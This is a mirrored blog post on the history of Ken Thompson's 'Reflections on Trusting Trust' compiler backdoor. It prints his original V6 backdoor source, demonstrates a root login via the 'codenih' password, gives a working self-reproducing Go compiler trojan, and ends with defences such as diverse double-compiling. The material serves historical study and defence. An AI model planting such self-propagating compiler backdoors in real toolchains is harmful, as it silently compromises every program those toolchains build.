<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://research.swtch.com/nih">Original</a>
    <h1>Running the &#34;Reflections on Trusting Trust&#34; Compiler (2023)</h1>
    
    <div id="readability-page-1" class="page"><div>
      <div>
        
       


<p>
Supply chain security is a hot topic today, but it is a very old problem.
In October 1983, 40 years ago this week,
Ken Thompson chose supply chain security as the topic for his Turing award lecture,
although the specific term wasn’t used back then.
(The field of computer science was still young and small enough that the ACM conference where Ken spoke was
the “Annual Conference on Computers.”)
Ken’s lecture was later published in <i>Communications of the ACM</i>
under the title “<a href="https://dl.acm.org/doi/pdf/10.1145/358198.358210">Reflections on Trusting Trust</a>.”
It is a classic paper, and a short one (3 pages);
if you haven’t read it yet, you should. This post will still be here when you get back.
</p>

<p>
In the lecture, Ken explains in three steps how to modify a C compiler binary
to insert a backdoor when compiling the “login” program,
leaving no trace in the source code.
In this post, we will run the backdoored compiler using Ken’s actual code.
But first, a brief summary of the important parts of the lecture.
</p>

<a href="#step1"><h2 id="step1">Step 1: Write a Self-Reproducing Program</h2></a>

<p>
Step 1 is to write a program that prints its own source code.
Although the technique was not widely known in 1975,
such a program is now known in computing as a “<a href="https://en.wikipedia.org/wiki/Quine_(computing)">quine</a>,”
popularized by Douglas Hofstadter in <i>Gödel, Escher, Bach</i>.
Here is a Python quine, from <a href="https://cs.lmu.edu/~ray/notes/quineprograms/">this collection</a>:
</p>

<pre>s=<span>’s=%r;print(s%%s)’</span>;print(s%s)
</pre>

<p>
And here is a slightly less cryptic Go quine:
</p>

<pre>package main
func main() { print(q + &#34;\x60&#34; + q + &#34;\x60&#34;) }
var q = <span>`package main
func main() { print(q + &#34;\x60&#34; + q + &#34;\x60&#34;) }
var q = `</span>
</pre>

<p>The general idea of the solution is to put the text of the program into a string literal, with some kind of placeholder where the string itself should be repeated. Then the program prints the string literal, substituting that same literal for the placeholder.
In the Python version, the placeholder is <code>%r</code>;
in the Go version, the placeholder is implicit at the end of the string.
For more examples and explanation, see my post “<a href="https://cceckman.com/reading/roundups/2025-11-13/zip">Zip Files All The Way Down</a>,” which uses a Lempel-Ziv quine to construct a zip file that contains itself.
</p>

<a href="#step2"><h2 id="step2">Step 2: Compilers Learn</h2></a>

<p>
Step 2 is to notice that when a compiler compiles itself,
there can be important details that persist only in the compiler
binary, not in the actual source code.
Ken gives the example of the numeric values of escape sequences in C strings.
You can imagine a compiler containing code like this during
the processing of escaped string literals:
</p>

<pre>c = next();
if(c == &#39;\\&#39;) {
    c = next();
    if(c == &#39;n&#39;)
        c = &#39;\n&#39;;
}
</pre>

<p>
That code is responsible for processing the two character sequence <code>\n</code>
in a string literal
and turning it into a corresponding byte value,
specifically <code>’\n’</code>.
But that’s a circular definition, and the first time you write code like that it won’t compile.
So instead you write <code>c = 10</code>,
you compile and install the compiler, and <i>then</i> you can change
the code to <code>c = ’\n’</code>.
The compiler has “learned” the value of <code>’\n’</code>,
but that value only appears in the compiler binary,
not in the source code.
</p>

<a href="#step3"><h2 id="step3">Step 3: Learn a Backdoor</h2></a>

<p>
Step 3 is to put these together to help the compiler “learn”
to miscompile the target program (<code>login</code> in the lecture).
It is fairly straightforward to write code in a compiler
to recognize a particular input program and modify its code,
but that code would be easy to find if the compiler source were inspected.
Instead, we can go deeper, making two changes to the compiler:
</p>

<ol>
<li>Recognize <code>login</code> and insert the backdoor.
</li><li>Recognize the compiler itself and insert the code for these two changes.
</li></ol>

<p>
The “insert the code for these two changes” step requires being able to write
a self-reproducing program: the code must reproduce itself
into the new compiler binary.
At this point, the compiler binary has “learned” the miscompilation steps,
and the clean source code can be restored.
</p>

<a href="#run"><h2 id="run">Running the Code</h2></a>

<p>At the Southern California Linux Expo in March 2023,
Ken gave the closing keynote,
<a href="https://www.youtube.com/live/kaandEt_pKw?si=RGKrC8c0B9_AdQ9I&amp;t=643">a delightful talk</a>
about his 75-year effort accumulating what must be the world’s
largest privately held digital music collection,
complete with actual jukeboxes and a player piano (video opens at 10m43s, when his talk begins).
During the Q&amp;A session, someone <a href="https://www.youtube.com/live/kaandEt_pKw?si=koOlE35Q3mjqH4yf&amp;t=3284">jokingly asked</a> about the Turing award lecture, specifically
“can you tell us right now whether you have a backdoor into every copy of gcc and Linux still today?”
Ken replied:
</p>

<blockquote>
I assume you’re talking about some paper I wrote a long time ago.
No, I have no backdoor.
That was very carefully controlled, because there were some spectacular fumbles before that.
I got it released, or I got somebody to steal it from me, in a very controlled sense,
and then tracked whether they found it or not.
And they didn’t.
But they broke it, because of some technical effect,
but they didn’t find out what it was and then track it.
So it never got out, if that’s what you’re talking about.
I hate to say this in front of a big audience, but
the one question I’ve been waiting for since I wrote that paper is
“you got the code?”
Never been asked.
I still have the code.
</blockquote>

<p>Who could resist that invitation!?
Immediately after watching the video on YouTube in September 2023,
I emailed Ken and asked him for the code.
Despite my being six months late, he said I was the first person to ask
and mailed back an attachment called <code>nih.a</code>,
a cryptic name for a cryptic program.
(Ken tells me it does in fact stand for “not invented here.”)
Normally today, <code>.a</code> files are archives containing
compiler object files,
but this one contains two source files.</p>

<p>
The code applies cleanly to the C compiler from the
<a href="https://en.wikipedia.org/wiki/Research_Unix">Research Unix Sixth Edition (V6)</a>.
I’ve posted an online emulator that runs V6 Unix programs
and populated it with some old files from Ken and Dennis,
including <code>nih.a</code>.
Let’s actually run the code.
You can <a href="https://research.swtch.com/v6">follow along in the simulator</a>.</p>


<table>
<tbody><tr>
<td>
<p>Login as <code>ken</code>, password <code>ken</code>.</p></td><td><pre>login: <b>ken</b>
Password: <b>ken</b>

% <b>who</b>
ken     tty8 Aug 14 22:06
%
</pre>
</td></tr><tr>
<td>
<p>Change to and list the <code>nih</code> directory,</p></td><td><pre>% <b>chdir nih</b>
% <b>ls</b>
nih.a
</pre>
</td></tr><tr>
<td>
<p>Extract <code>nih.a</code>.
</p></td><td><pre>% <b>ar xv nih.a</b>
x x.c
x rc
</pre>
</td></tr><tr>
<td>
<p>Let’s read <code>x.c</code>, a C program.
</p></td><td><pre>% <b>cat x.c</b>
</pre>
</td></tr><tr>
<td>
<p>Declare the global variable <code>nihflg</code>,</p></td><td><pre>nihflg;
</pre>
</td></tr><tr>
<td>
<p>
Define the function <code>codenih</code>, with implied</p></td><td><pre>codenih()
{
    char *p,*s;
    int i;
</pre>
</td></tr><tr>
<td>
<p><code>cc -p</code> prints the preprocessor output</p></td><td><pre>    if(pflag)
        return;
</pre>
</td></tr><tr>
<td>
<p>Skip leading tabs in the line.
</p></td><td><pre>    p=line;
    while(*p==&#39;\t&#39;)
        p++;
</pre>
</td></tr><tr>
<td>
<p>Look for the line</p></td><td><pre>    s=&#34;namep = crypt(pwbuf);&#34;;
    for(i=0;i&lt;21;i++)
        if(s[i]!=p[i])
            goto l1;
</pre>
</td></tr><tr>
<td>
<p>Define <code>login</code> backdoor code <code>s</code>, which does:</p></td><td><pre>    p=+i;
    s=&#34;for(c=0;c&lt;8;c++)&#34;
      &#34;if(\&#34;codenih\&#34;[c]!=pwbuf[c])goto x1x;&#34;
      &#34;while(*namep)namep++;&#34;
      &#34;while(*np!=&#39;:&#39;)np++;x1x:&#34;;
</pre>
</td></tr><tr>
<td>
<p>With the <code>p=+i</code> from above,</p></td><td><pre>    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    goto l4;
</pre>
</td></tr><tr>
<td>
<p>No match for <code>login</code> code. Next target:</p></td><td><pre>l1:
    s=&#34;av[4] = \&#34;-P\&#34;;&#34;;
    for(i=0;i&lt;13;i++)
        if(s[i]!=p[i])
            goto l2;
</pre>
</td></tr><tr>
<td>
<p>Increment <code>nihflg</code> to 1 to remember</p></td><td><pre>    nihflg++;
    goto l4;
</pre>
</td></tr><tr>
<td>
<p>
Next target: <a href="https://cceckman.com/reading/roundups/2025-11-13/cc.c#getline">input reading loop in <code>cc.c</code></a>,</p></td><td><pre>l2:
    if(nihflg!=1)
        goto l3;
    s=&#34;while(getline()) {&#34;;
    for(i=0;i&lt;18;i++)
        if(s[i]!=p[i])
            goto l3;
</pre>
</td></tr><tr>
<td>
<p>
Append input-reading backdoor: call <code>codenih</code></p></td><td><pre>    p=+i;
    s=&#34;codenih();&#34;;
    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    nihflg++;
    goto l4;
</pre>
</td></tr><tr>
<td>
<p>Next target: <a href="https://cceckman.com/reading/roundups/2025-11-13/cc.c#fflush">flushing output in <code>cc.c</code></a>.
</p></td><td><pre>l3:
    if(nihflg!=2)
        goto l4;
    s=&#34;fflush(obuf);&#34;;
    for(i=0;i&lt;13;i++)
        if(s[i]!=p[i])
            goto l4;
</pre>
</td></tr><tr>
<td>
<p>Insert end-of-file backdoor: call <code>repronih</code></p></td><td><pre>    p=+i;
    s=&#34;repronih();&#34;;
    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    nihflg++;
l4:;
}
</pre>
</td></tr><tr>
<td>
<p>Here the magic begins, as presented in the</p></td><td><pre>char nihstr[]
{
%0
};
</pre>
</td></tr><tr>
<td>
<p>The magic continues.<br/>
</p></td><td><pre>repronih()
{
    int i,n,c;
</pre>
</td></tr><tr>
<td>
<p>If <code>nihflg</code> is not 3, this is not <code>cc.c</code></p></td><td><pre>    if(nihflg!=3)
        return;
</pre>
</td></tr><tr>
<td>
<p>The most cryptic part of the whole program.</p><div>
<p><code>n=0</code>: emit literal text before “<code>%</code>”</p></div>
</td><td><pre>    n=0;
    i=0;
    for(;;)
    switch(c=nihstr[i++]){
</pre>
</td></tr><tr>
<td>
<p><code>045</code> is <code>&#39;%&#39;</code>, kept from appearing</p></td><td><pre>    case 045:
        n++;
        if(n==1)
            i=0;
        if(n!=2)
            continue;
</pre>
</td></tr><tr>
<td>
<p>In phases 1 and 2, emit octal byte value</p></td><td><pre>    default:
        if(n==1||n==2){
            putc(&#39;0&#39;,obuf);
            if(c&gt;=0100)
                putc((c&gt;&gt;6)+&#39;0&#39;,obuf);
            if(c&gt;=010)
                putc(((c&gt;&gt;3)&amp;7)+&#39;0&#39;,obuf);
            putc((c&amp;7)+&#39;0&#39;,obuf);
            putc(&#39;,&#39;,obuf);
            putc(&#39;\n&#39;,obuf);
            continue;
        }
</pre>
</td></tr><tr>
<td>
<p>In phases 0 and 4, emit literal byte value,</p></td><td><pre>        if(n!=3)
            putc(c,obuf);
        continue;
</pre>
</td></tr><tr>
<td>
<p>Reaching end of <code>nihstr</code> increments the phase</p></td><td><pre>    case 0:
        n++;
        i=0;
        if(n==5){
            fflush(obuf);
            return;
        }
    }
}
</pre>
</td></tr><tr>
<td>
<p>Now let’s read <code>rc</code>, a shell script.
</p></td><td><pre>% <b>cat rc</b>
</pre>
</td></tr><tr>
<td>
<p>Start the editor <code>ed</code> on <code>x.c</code>.</p></td><td><pre>ed x.c
</pre>
</td></tr><tr>
<td>
<p>Delete all tabs from every line.
</p></td><td><pre>1,$s/    //g
</pre>
</td></tr><tr>
<td>
<p>Write the modified file to <code>nih.c</code> and quit.</p></td><td><pre>w nih.c
q
</pre>
</td></tr><tr>
<td>
<p>Octal dump bytes of <code>nih.c</code> into <code>x</code>.</p>
<p><code>% echo az | od -b</code></p>
<p>Note the trailing <code>000</code> for an odd-sized input.<br/>


</p></td><td><pre>od -b nih.c &gt;x
</pre>
</td></tr><tr>
<td>
<p>Back into <code>ed</code>, this time editing <code>x</code>.
</p></td><td><pre>ed x
</pre>
</td></tr><tr>
<td>
<p>Remove the leading file offsets, adding a <code>0</code></p></td><td><pre>1,$s/^....... 0*/0/
</pre>
</td></tr><tr>
<td>
<p>Replace each space before a byte value</p></td><td><pre>1,$s/ 0*/\
0/g
</pre>
</td></tr><tr>
<td>
<p>Delete 0 values caused by odd-length padding</p></td><td><pre>g/^0$/d
</pre>
</td></tr><tr>
<td>
<p>Add trailing commas to each line.
</p></td><td><pre>1,$s/$/,/
</pre>
</td></tr><tr>
<td>
<p>Write <code>x</code> and switch to <code>nih.c</code>.
</p></td><td><pre>w x
e nih.c
</pre>
</td></tr><tr>
<td>
<p>Move to and delete the magic <code>%0</code> line.
</p></td><td><pre>/%/d
</pre>
</td></tr><tr>
<td>
<p>Read <code>x</code> (the octal values) into the file there.
</p></td><td><pre>.-1r x
</pre>
</td></tr><tr>
<td>
<p>Add a trailing <code>0</code> to end the array.
</p></td><td><pre>.a
0
.
</pre>
</td></tr><tr>
<td>
<p>Write <code>nih.c</code> and quit. All done!
</p></td><td><pre>w nih.c
q
</pre>
</td></tr><tr>
<td>
<p>Let’s run <code>rc</code>.</p></td><td><pre>% <b>sh rc</b>
1314
1163
5249
6414
1163
6414
7576
</pre>
</td></tr><tr>
<td>
<p>Let’s check the output, <code>nih.c</code>.</p></td><td><pre>% <b>cat nih.c</b>
nihflg;
codenih()
{
char *p,*s;
int i;
if(pflag)
return;
<span>...</span>
char nihstr[]
{
0156,
0151,
0150,
0146,
<span>...</span>
0175,
012,
0175,
012,
0
};
repronih()
{
int i,n,c;
<span>...</span>
</pre>
</td></tr><tr>
<td>
<p>Let’s make an evil compiler,</p></td><td><pre>% <b>cp /usr/source/s1/cc.c cc.c</b>
% <b>cp cc.c ccevil.c</b>
% <b>ed ccevil.c</b>
12902
</pre>
</td></tr><tr>
<td>
<p>Add <code>codenih</code> after <code>getline</code>.
</p></td><td><pre><b>/getline/</b>
    while(getline()) {
<b>s/$/ codenih();/</b>
<b>.</b>
    while(getline()) { codenih();
</pre>
</td></tr><tr>
<td>
<p>Add <code>repronih</code> after <code>fflush</code>.
</p></td><td><pre><b>/fflush/</b>
    fflush(obuf);
<b>s/$/ repronih();/</b>
<b>.</b>
    fflush(obuf); repronih();
</pre>
</td></tr><tr>
<td>
<p>Add <code>nih.c</code> at the end of the file.
</p></td><td><pre><b>$r nih.c</b>
7576
<b>w</b>
20501
<b>q</b>
</pre>
</td></tr><tr>
<td>
<p>Build the evil and good code with the good <code>cc</code>.
</p></td><td><pre>% <b>cc ccevil.c; mv a.out ccevil</b>
% <b>cc cc.c; mv a.out ccgood</b>
% <b>ls -l ccevil ccgood</b>
-rwxrwxrwx  1 ken     12918 Aug 14 22:19 ccevil
-rwxrwxrwx  1 ken     10724 Aug 14 22:19 ccgood
</pre>
</td></tr><tr>
<td>
<p>The good compiler still compiles</p></td><td><pre>% <b>ccgood cc.c</b>
% <b>ls -l a.out</b>
-rwxrwxrwx  1 ken     10724 Aug 14 22:19 a.out
</pre>
</td></tr><tr>
<td>
<p>The evil compiler compiles</p></td><td><pre>% <b>ccevil cc.c</b>
% <b>ls -l a.out</b>
-rwxrwxrwx  1 ken     12918 Aug 14 22:19 a.out
</pre>
</td></tr><tr>
<td>
<p>The evil compilers don’t match exactly,</p></td><td><pre>% <b>cmp a.out ccevil</b>
a.out ccevil differ: char 9428, line 377
% <b>cmp -l a.out ccevil</b>
 9428  56 145
 9429 157 166
 9430   0 151
 9431   0 154
 9432   0  56
 9433   0 157
% <b>cp a.out ccevil</b>
% <b>ccevil cc.c</b>
% <b>cmp a.out ccevil</b>
%
</pre>
</td></tr><tr>
<td>
<p>Let’s install the evil compiler.
</p></td><td><pre>% <b>su</b>
password: <b>root</b>
# <b>cp ccevil /bin/cc</b>
</pre>
</td></tr><tr>
<td>
<p>Let’s rebuild everything from clean sources.</p></td><td><pre># <b>cc /usr/source/s1/cc.c</b>
# <b>cp a.out /bin/cc</b>
# <b>ls -l /bin/cc</b>
-rwxrwxr-x  1 bin     12918 Aug 14 22:30 /bin/cc
# <b>cc /usr/source/s1/login.c</b>
# <b>cp a.out /bin/login</b>
# ^D
</pre>
</td></tr><tr>
<td>
<p>Now we can log in as root</p></td><td><pre>% ^D

login: <b>root</b>
Password: <b>codenih</b>

# <b>who</b>
root    tty8 Aug 14 22:32
#
</pre>
</td></tr></tbody></table>

<a href="#timeline"><h2 id="timeline">Timeline</h2></a>

<p>
This code can be dated to some time in the one-year period
from June 1974 to June 1975, probably early 1975.
</p>

<p>
The code does not work in V5 Unix, released in June 1974.
At the time, the C preprocessor code only processed
input files that began with the first character ‘#’.
The backdoor is in the preprocessor,
and the V5 <code>cc.c</code> did not start with ‘#’
and so wouldn’t have been able to modify itself.
The <a href="https://seclab.cs.ucdavis.edu/projects/history/papers/karg74.pdf">Air Force review of Multics security</a>
that Ken credits for inspiring the backdoor is also dated June 1974.
So the code post-dates June 1974.
</p>

<p>
Although it wasn’t used in V6,
the archive records the modification time (mtime)
of each file it contains.
We can read the mtime directly from the archive using a modern Unix system:
</p>

<pre>% hexdump -C nih.a
00000000  6d ff 78 2e 63 00 00 00  00 00 <b>46 0a 6b 64</b> 06 b6  |m.x.c.....F.kd..|
00000010  22 05 6e 69 68 66 6c 67  3b 0a 63 6f 64 65 6e 69  |&#34;.nihflg;.codeni|
...
00000530  7d 0a 7d 0a 72 63 00 00  00 00 00 00 <b>46 0a eb 5e</b>  |}.}.rc......F..^|
00000540  06 b6 8d 00 65 64 20 78  2e 63 0a 31 2c 24 73 2f  |....ed x.c.1,$s/|
% date -r 0x0a46646b  # BSD date. On Linux: date -d @$((0x0a46646b))
Thu Jun 19 00:49:47 EDT 1975
% date -r 0x0a465eeb
Thu Jun 19 00:26:19 EDT 1975
%
</pre>

<p>
So the code was done by June 1975.
</p>

<a href="#deployment"><h2 id="deployment">Controlled Deployment</h2></a>

<p>
In addition to the quote above from the Q&amp;A, the story of the deployment
of the backdoor has been told publicly many times
(<a href="https://groups.google.com/g/net.lang.c/c/kYhrMYcOd0Y/m/u_D2lWAUCQoJ">1</a>
<a href="https://niconiconi.neocities.org/posts/ken-thompson-really-did-launch-his-trusting-trust-trojan-attack-in-real-life/">2</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024478.html">3</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024485.html">4</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024486.html">5</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024487.html">6</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-November/024657.html">7</a>),
sometimes with conflicting minor details.
Based on these many tellings, it seems clear
that it was the <a href="https://en.wikipedia.org/wiki/PWB/UNIX">PWB group</a>
(not <a href="https://gunkies.org/wiki/USG_UNIX">USG</a> as sometimes reported)
that was induced to copy the backdoored C compiler,
that eventually the login program on that system got backdoored too,
that PWB discovered something was amiss
because the compiler got bigger each time it compiled itself,
and that eventually they broke the reproduction and
ended up with a clean compiler.

</p><p>
John Mashey tells the story of the PWB group obtaining and discovering the backdoor
and then him overhearing Ken and Robert H. Morris discussing it
(<a href="https://groups.google.com/g/net.lang.c/c/W4Oj3EVAvNc/m/XPAtApNycLUJ">1</a>
<a href="https://mstdn.social/@JohnMashey/109991275086879095">2</a> <a href="https://archive.computerhistory.org/resources/access/text/2018/10/102738835-05-01-acc.pdf">3</a> (pp. 29-30)
<a href="https://www.youtube.com/watch?v=Vd7aH2RrcTc&amp;t=4776s">4</a>).
In Mashey’s telling, PWB obtained the backdoor weeks after he read John Brunner’s classic book <i>Shockwave Rider</i>,
which was published in early 1975.
(It appeared in the “New Books” list in the <i>New York Times</i> on March 5, 1975 (p. 37).)

</p><p>
All tellings of this story agree that the compiler didn’t make it any farther than PWB.
Eric S. Raymond’s Jargon File contains <a href="http://www.catb.org/jargon/html/B/back-door.html">an entry for backdoor</a>
with rumors to the contrary. After describing Ken’s work, it says:</p>

<blockquote>
Ken says the crocked compiler was never distributed. Your editor has heard two separate reports that suggest that the crocked login did make it out of Bell Labs, notably to BBN, and that it enabled at least one late-night login across the network by someone using the login name “kt”.
</blockquote>

<p>I mentioned this to Ken, and he said it could not have gotten to BBN.
The technical details don’t line up either: as we just saw,
the login change only accepts “codenih”
as a password for an account that already exists.
So the Jargon File story is false.
</p>

<p>Even so, it turns out that the backdoor did leak out in one specific sense.
In 1997, Dennis Ritchie gave Warren Toomey (curator of the TUHS archive) a collection of old tape images.
Some bits were posted then, and others were held back.
In July 2023, Warren <a href="https://www.tuhs.org/Archive/Applications/Dennis_Tapes/">posted</a>
and <a href="https://www.tuhs.org/pipermail/tuhs/2023-July/028590.html">announced</a>
the full set.
One of the tapes contains various files from Ken, which Dennis had described as
“A bunch of interesting old ken stuff (eg a version of
the units program from the days when the dollar fetched
302.7 yen).”
Unnoticed in those files is <code>nih.a</code>, dated July 3, 1975.
When I wrote to Ken, he sent me a slightly different <code>nih.a</code>:
it contained the exact same files, but dated January 28, 1998,
and in the modern textual archive format rather than the binary V6 format.
The V6 simulator contains the <code>nih.a</code> from Dennis’s tapes.
</p>

<a href="#buggy"><h2 id="buggy">A Buggy Version</h2></a>

<p>
The backdoor was noticed because the compiler got one byte larger
each time it compiled itself.
About a decade ago, Ken told me that it was an extra NUL byte added to a string each time,
“just a bug.”
We can see which string constant it must have been (<code>nihstr</code>),
but the version we just built does not have that bug—Ken says he didn’t save the buggy version.
An interesting game would be to try to reconstruct the most plausible diff that
reintroduces the bug.
</p>

<p>
It seems to me that to add an extra NUL byte each time,
you need to use <code>sizeof</code> to decide
when to stop the iteration, instead of stopping at the first NUL.
My best attempt is:
</p>

<pre> repronih()
 {
     int i,n,c;
     if(nihflg!=3)
         return;
<span>-    n=0;</span>
<span>-    i=0;</span>
<span>-    for(;;)</span>
<span>+    for(n=0; n&lt;5; n++)</span>
<span>+    for(i=0; i&lt;sizeof nihstr; )</span>
     switch(c=nihstr[i++]){
     case 045:
         n++;
         if(n==1)
             i=0;
         if(n!=2)
             continue;
     default:
         if(n==1||n==2){
             putc(&#39;0&#39;,obuf);
             if(c&gt;=0100)
                 putc((c&gt;&gt;6)+&#39;0&#39;,obuf);
             if(c&gt;=010)
                 putc(((c&gt;&gt;3)&amp;7)+&#39;0&#39;,obuf);
             putc((c&amp;7)+&#39;0&#39;,obuf);
             putc(&#39;,&#39;,obuf);
             putc(&#39;\n&#39;,obuf);
             continue;
         }
         if(n!=3)
             putc(c,obuf);
         continue;
<span>-    case 0:</span>
<span>-        n++;</span>
<span>-        i=0;</span>
<span>-        if(n==5){</span>
<span>-            fflush(obuf);</span>
<span>-            return;</span>
<span>-        }</span>
     }
<span>+    fflush(obuf);</span>
 }
</pre>

<p>
I doubt this was the actual buggy code, though: it’s too structured compared to the fixed version.
And if the code had been written this way, it would have been easier to
remove the 0 being added in the <code>rc</code> script
than to complicate the code. But maybe.
</p>

<p>
Also note that the compiler cannot get one byte larger
each time it compiles itself, because V6 Unix binaries
were rounded up to a 2-byte boundary.
While <code>nihstr</code> gets one byte larger each time,
the compiler binary gets two bytes larger every second time.
</p>

<a href="#modern"><h2 id="modern">A Modern Version</h2></a>

<p>
Even seeing the code run in the V6 simulator,
it can be easy to mentally dismiss this kind of backdoor as an old problem.
Here is a more modern variant.
</p>

<p>
The Go compiler reads input files using a routine called <code>Parse</code>
in the package <code>cmd/compile/internal/syntax</code>.
The input is abstracted as an <code>io.Reader</code>,
so if we want to replace the input, we need to interpose a new reader.
We can do that easily enough:
</p>

<pre>     var p parser
<span>+    src = &amp;evilReader{src: src}</span>
     p.init(base, src, errh, pragh, mode)
</pre>

<p>
Then we need to implement <code>evilReader</code>, which is not too difficult either:
</p>

<pre>type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

func (r *evilReader) Read(b []byte) (int, error) {
    if r.data == nil {
        data, err := io.ReadAll(r.src)
        s := string(data)
        if evilContains(s, &#34;package main&#34;) &amp;&amp; evilContains(s, &#34;\&#34;hello, world\\n\&#34;&#34;) {
            s = evilReplace(s,
                &#34;\&#34;hello, world\\n\&#34;&#34;,
                &#34;\&#34;backdoored!\\n\&#34;&#34;)
        }
        if evilContains(s, &#34;package syntax&#34;) &amp;&amp; evilContains(s, &#34;\nfunc Parse(base *PosBase, src io.Reader&#34;) {
            s = evilReplace(s,
                &#34;p.init(base, src, errh, pragh, mode)&#34;,
                &#34;src=&amp;evilReader{src:src}; p.init(base, src, errh, pragh, mode)&#34;)
            s += evilSource()
        }
        r.data = []byte(s)
        r.err = err
    }
    if r.err != nil {
        return 0, r.err
    }
    n := copy(b, r.data)
    r.data = r.data[n:]
    if n == 0 {
        return 0, io.EOF
    }
    return n, nil
}
</pre>

<p>
The first replacement rewrites a “hello, world” program to a “backdoored!” program.
The second replacement reproduces the change inside the compiler.
To make this work inside the compiler, we need <code>evilSource</code> to return
the source code of the <code>evilReader</code>,
which we know how to do.
The <code>evilContains</code> and <code>evilReplace</code>
functions are reimplementations of <code>strings.Contains</code> and <code>strings.Replace</code>,
since the code in question does not import <code>strings</code>,
and the build system may not have provided it for the compiler to import.
</p>

<p>
Completing the code:
</p>

<pre>func evilIndex(s, t string) int {
    for i := 0; i &lt; len(s)-len(t); i++ {
        if s[i:i+len(t)] == t {
            return i
        }
    }
    return -1
}

func evilContains(s, t string) bool {
    return evilIndex(s, t) &gt;= 0
}

func evilReplace(s, old, new string) string {
    i := evilIndex(s, old)
    if i &lt; 0 {
        return s
    }
    return s[:i] + new + s[i+len(old):]
}

func evilSource() string {
    return &#34;\n\n&#34; + evilText + &#34;\nvar evilText = \x60&#34; + evilText + &#34;\x60\n&#34;
}

var evilText = <span>`
type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

...

func evilSource() string {
    return &#34;\n\n&#34; + evilText + &#34;\nvar evilText = \x60&#34; + evilText + &#34;\x60\n&#34;
}
`</span>
</pre>

<p>
Now we can install it, delete the source code changes, and install the compiler from clean sources. The change persists:
</p>

<pre>% go install cmd/compile
% git stash
Saved working directory ...
% git diff  # source is clean!
% go install cmd/compile
% cat &gt;x.go
package main

func main() {
    print(&#34;hello, world\n&#34;)
}
^D
% go run x.go
backdoored!
%
</pre>


<a href="#reflections"><h2 id="reflections">Reflections on Reflections</h2></a>

<p>With all that experience behind us, a few observations from the vantage point of 2023.

</p><p><a href="#short"><b id="short">It’s short!</b></a>
When Ken sent me <code>nih.a</code> and I got it running,
my immediate reaction was disbelief at the size of the change: 99 lines of code,
plus a 20-line shell script.
If you already know how to make a program print itself,
the biggest surprise is that there are no surprises!

</p><p>
It’s one thing to say “I know how to do it in theory”
and quite another to see how small and straightforward the backdoor is in practice.
In particular, hooking into source code reading makes it trivial.
Somehow, I’d always imagined some more complex pattern matching
on an internal representation in the guts of the compiler,
not a textual substitution.
Seeing it run, and seeing how tiny it is,
really drives home how easy it would be to make a change like this
and how important it is to build from trusted sources
using trusted tools.

</p><p>
I don’t say any of this to put down Ken’s doing it in the first place:
it seems easy <i>because</i> he did it and explained it to us.
But it’s still very little code for an extremely serious outcome.

</p><p><a href="#go"><b id="go">Bootstrapping Go</b></a>.
In the early days of working on and talking about
<a href="https://go.dev/">Go</a>,
people often asked us why the Go compiler
was written in C, not Go.
The real reason is that we wanted to spend our time making
Go a good language for distributed systems
and not on making it a good language for writing compilers,
but we would also jokingly respond that
people wouldn’t trust a self-compiling compiler from Ken.
After all, he had ended his Turing lecture by saying:
</p>

<blockquote>
The moral is obvious. You can’t trust code that you did not totally create yourself.
(Especially code from companies that employ people like me.)
No amount of source-level verification or scrutiny will protect you from using untrusted code.
</blockquote>

<p>
Today, however, the Go compiler does compile itelf,
and that prompts the important question of why it should
be trusted, especially when a backdoor is so easy to add.
The answer is that we have never required that the
compiler rebuild itself.
Instead the compiler always builds from an earlier
released version of the compiler.
This way, anyone can reproduce the current binaries
by starting with Go 1.4 (written in C), using
Go 1.4 to compile Go 1.5, Go 1.5 to compile Go 1.6,
and so on.
There is no point in the cycle where the compiler
is required to compile itself,
so there is no place for a binary-only backdoor to hide.
In fact, we recently published programs to make it easy to
rebuild and verify the Go toolchains,
and we demonstrated how to use them to verify
one version of Ubuntu’s Go toolchain without using Ubuntu at all.
See “<a href="https://go.dev/blog/rebuild">Perfectly Reproducible, Verified Go Toolchains</a>” for details.
</p>

<p><a href="#ddc"><b id="ddc">Bootstrapping Trust</b></a>.
An important advancement since 1983 is that we know a defense against this backdoor,
which is to build the compiler source two different ways.

</p><p>
<img name="ddc" width="482" height="245" src="https://cceckman.com/reading/roundups/2025-11-13/ddc.png" srcset="ddc.png 1x, ddc@2x.png 2x"/>

</p><p>
Specifically, suppose we have the suspect binary – compiler 1 – and its source code.
First, we compile that source code with a trusted second compiler, compiler 2,
producing compiler 2.1.
If everything is on the up-and-up, compiler 1 and compiler 2.1
should be semantically equivalent,
even though they will be very different at the binary level,
since they were generated by different compilers.
Also, compiler 2.1 cannot contain
a binary-only backdoor inserted by compiler 1,
since it wasn’t compiled with that compiler.
Now we compile the source code again with both compiler 1 and compiler 2.1.
If they really are semantically equivalent,
then the outputs, compilers 1.1 and 2.1.1, should be bit-for-bit identical.
If that’s true, then we’ve established that compiler 1 does not insert any
backdoors when compiling itself.
</p>

<p>
The great thing about this process is that we don’t even need to know which of compiler 1 and 2
might be backdoored.
If compilers 1.1 and 2.1.1 are identical,
then they’re either both clean or both backdoored the same way.
If they are independent implementations
from independent sources,
the chance of both being backdoored the same way is far less likely
than the chance of compiler 1 being backdoored.
We’ve bootstrapped trust in compiler 1 by comparing it against compiler 2,
and vice versa.
</p>

<p>
Another great thing about this process is that
compiler 2 can be a custom, small translator
that’s incredibly slow and not fully general
but easier to verify and trust.
All that matters is that it can run well enough
to produce compiler 2.1,
and that the resulting code runs well enough
to produce compiler 2.1.1.
At that point, we can switch back to the fast,
fully general compiler 1.
</p>

<p>
This approach is called “diverse double-compiling,”
and the definitive reference is
<a href="https://dwheeler.com/trusting-trust/">David A. Wheeler’s PhD thesis and related links</a>.
